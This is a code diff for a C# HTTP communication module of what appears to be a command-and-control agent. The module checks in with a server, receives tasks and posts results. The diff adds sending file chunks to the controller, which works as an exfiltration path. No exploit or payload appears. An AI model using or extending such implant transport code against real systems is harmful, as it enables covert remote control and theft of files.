@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Agent.Service;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -21,7 +22,7 @@ namespace Agent.Models
         private CancellationTokenSource _tokenSource;
 
         private HttpClient _client;
-        public HttpCommModule(MessageManager messManager) : base(messManager)
+        public HttpCommModule(MessageService messManager, FileService fileService) : base(messManager, fileService)
         {
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
@@ -73,9 +74,30 @@ namespace Agent.Models
             {
                 try
                 {
-                    var results = this.MessageManager.GetMessageResultsToRelay();
+                    var results = this.MessageService.GetMessageResultsToRelay();
+
+                    var thisAgentRes = results.Where(a => a.Header.Owner == this.MessageService.AgentMetaData.Id);
+                    if (thisAgentRes.Any())
+                    {
+                        foreach (var mess in thisAgentRes)
+                            mess.FileChunk = this.FileService.GetChunkToSend();
+                    }
+                    else
+                    {
+                        var chunk = this.FileService.GetChunkToSend();
+                        if (chunk != null)
+                        {
+                            var mess = new MessageResult();
+                            mess.Header.Owner = this.MessageService.AgentMetaData.Id;
+                            mess.FileChunk = chunk;
+                            results.Add(mess);
+                        }
+                    }
+
                     if (results.Any())
+                    {
                         await PostData(results);
+                    }
                     else
                         await this.CheckIn();
                 }
@@ -94,7 +116,7 @@ namespace Agent.Models
 
         private async Task CheckIn()
         {
-            var response = await _client.GetByteArrayAsync($"/{this.MessageManager.AgentMetaData.Id}");
+            var response = await _client.GetByteArrayAsync($"/{this.MessageService.AgentMetaData.Id}");
             HandleResponse(response);
         }
 
@@ -103,11 +125,11 @@ namespace Agent.Models
             //var ser = Encoding.UTF8.GetString(results.Serialize());
             foreach (var resMess in results)
             {
-                resMess.Header.Path.Insert(0,this.MessageManager.AgentMetaData.Id);
+                resMess.Header.Path.Insert(0, this.MessageService.AgentMetaData.Id);
             }
 
             var content = new StringContent(Encoding.UTF8.GetString(results.Serialize()), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync($"/{this.MessageManager.AgentMetaData.Id}", content);
+            var response = await _client.PostAsync($"/{this.MessageService.AgentMetaData.Id}", content);
             var responseContent = await response.Content.ReadAsByteArrayAsync();
             this.HandleResponse(responseContent);
         }
@@ -116,7 +138,7 @@ namespace Agent.Models
         {
             //string bitString = Encoding.UTF8.GetString(response, 0, response.Length);
             var messages = response.Deserialize<List<MessageTask>>();
-            this.MessageManager.EnqueueTasks(messages);
+            this.MessageService.EnqueueTasks(messages);
         }
     }
 }
